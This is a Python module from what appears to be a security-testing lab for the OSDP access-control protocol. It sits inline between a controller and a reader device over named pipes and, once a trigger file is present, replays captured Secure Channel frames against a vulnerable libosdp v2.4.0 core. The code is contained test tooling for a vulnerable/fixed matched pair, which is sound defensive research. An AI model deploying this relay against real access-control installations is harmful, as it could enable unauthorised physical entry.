"""Inline fifo MITM for the cve-replay profile (ATK-05b, vuln half of the matched pair).

A POSIX named pipe has no broadcast mode: whoever reads a byte consumes it, so a
passive tap on the cp->pd pipe would starve the real PD. To replay
a genuine Secure Channel frame against the vulnerable libosdp v2.4.0 core, the
attacker therefore sits INLINE - exactly like the fixed profile's TCP relay - rather
than tapping: the controller talks to the attacker, the attacker relays to the PD,
and the same write-capable ``cve_replay_transform`` seam (04-03) that drives the TCP
relay drives this one.

Topology (two fifo buses on the shared volume):

- ``pd_bus-0`` / ``pd_bus-1``  : the PD (libosdp fifo server) creates these; the
  attacker is the PD's "CP" - it writes ``pd_bus-0`` (-> PD) and reads ``pd_bus-1``
  (PD ->).
- ``cp_bus-0`` / ``cp_bus-1``  : the attacker creates these (the real CP is a libosdp
  fifo *client* and only opens them); the attacker is the CP's "PD" - it reads
  ``cp_bus-0`` (CP ->) and writes ``cp_bus-1`` (-> CP).

Forward path keeps the live Secure Channel up; once the trigger file arms the
transform, the captured genuine secure frames are replayed toward the PD behind an
out-of-sequence REPLY_RMAC_I. No ports are published and no host mount is added
(SAFE-01 unchanged); the buses stay inside the lab on the shared named volume.
"""

from __future__ import annotations

import os
import threading
import time
from pathlib import Path

from interlock.osdp.attacks.replay import cve_replay_transform
from interlock.osdp.transport import Direction, Transform

# The PD creates pd_bus-{0,1}; the attacker creates cp_bus-{0,1} for the real CP.
PD_BUS = "/busvol/pd_bus"
CP_BUS = "/busvol/cp_bus"

# Injection arms only once this file exists (the matched-pair test touches it after it has
# confirmed a locked baseline), mirroring the TCP relay's _CVE_TRIGGER_PATH discipline.
TRIGGER_PATH = Path("/tmp/interlock-cve-fire")

BUFFER_SIZE = 4096
OPEN_RETRIES = 120
OPEN_BACKOFF_SECONDS = 0.5
# Hot relay loop: fast enough not to throttle the PD/CP's 20ms refresh, unlike the
# deliberately slow read-only tap.
PUMP_IDLE_SLEEP_SECONDS = 0.002


def _mkfifo(path: str) -> None:
    """Create ``path`` as a fresh named pipe (replacing any stale one from a prior run)."""
    try:
        os.unlink(path)
    except FileNotFoundError:
        pass
    os.mkfifo(path)


def _open_fifo(path: str) -> int:
    """Open ``path`` O_RDWR non-blocking, retrying until the peer (PD server) creates it.

    ``O_RDWR`` sidesteps the open()-blocks-until-peer POSIX fifo semantics (as libosdp's
    own ``channel_fifo_setup`` does); ``O_NONBLOCK`` keeps every read/write non-blocking.
    """
    last_error: OSError | None = None
    for _attempt in range(OPEN_RETRIES):
        try:
            return os.open(path, os.O_RDWR | os.O_NONBLOCK)
        except OSError as exc:
            last_error = exc
            time.sleep(OPEN_BACKOFF_SECONDS)
    raise ConnectionError(f"could not open fifo {path} after {OPEN_RETRIES} attempts") from last_error


def _pump(src_fd: int, dst_fd: int, direction: Direction, transform: Transform, *, label: str) -> None:
    """Relay ``src_fd`` -> ``dst_fd`` through ``transform``, forwarding (and injecting) bytes."""
    while True:
        try:
            data = os.read(src_fd, BUFFER_SIZE)
        except BlockingIOError:
            time.sleep(PUMP_IDLE_SLEEP_SECONDS)
            continue
        except OSError:
            print(f"interlock-lab: fifo relay {label} closed", flush=True)
            return
        if not data:
            time.sleep(PUMP_IDLE_SLEEP_SECONDS)
            continue
        out = transform(direction, data)
        if len(out) > len(data):
            print(
                f"interlock-lab: fifo relay {label} injected "
                f"{len(out) - len(data)} replay byte(s)",
                flush=True,
            )
        if out:
            try:
                os.write(dst_fd, out)
            except OSError:
                print(f"interlock-lab: fifo relay {label} write failed", flush=True)
                return


def main() -> None:
    """Sit inline between the real CP and the vuln PD, relaying and (once armed) replaying."""
    print("interlock-lab: fifo relay starting (inline cve MITM)", flush=True)

    # Provide the CP-side bus the real CP will dial, then attach to the PD-side bus.
    _mkfifo(f"{CP_BUS}-0")
    _mkfifo(f"{CP_BUS}-1")
    print(f"interlock-lab: fifo relay created {CP_BUS}-0/-1", flush=True)

    cp_rx = _open_fifo(f"{CP_BUS}-0")  # CP -> attacker
    cp_tx = _open_fifo(f"{CP_BUS}-1")  # attacker -> CP
    pd_tx = _open_fifo(f"{PD_BUS}-0")  # attacker -> PD
    pd_rx = _open_fifo(f"{PD_BUS}-1")  # PD -> attacker
    print("interlock-lab: fifo relay attached to both buses", flush=True)

    # One transform instance carries the per-direction buffers and the one-shot injection
    # state, armed by the shared trigger file (the test touches it after a locked baseline).
    transform = cve_replay_transform(armed=TRIGGER_PATH.exists)

    pd_to_cp = threading.Thread(
        target=_pump,
        args=(pd_rx, cp_tx, Direction.pd_to_cp, transform),
        kwargs={"label": "pd->cp"},
        daemon=True,
    )
    pd_to_cp.start()
    print("interlock-lab: fifo relay inline", flush=True)
    _pump(cp_rx, pd_tx, Direction.cp_to_pd, transform, label="cp->pd")


if __name__ == "__main__":
    main()
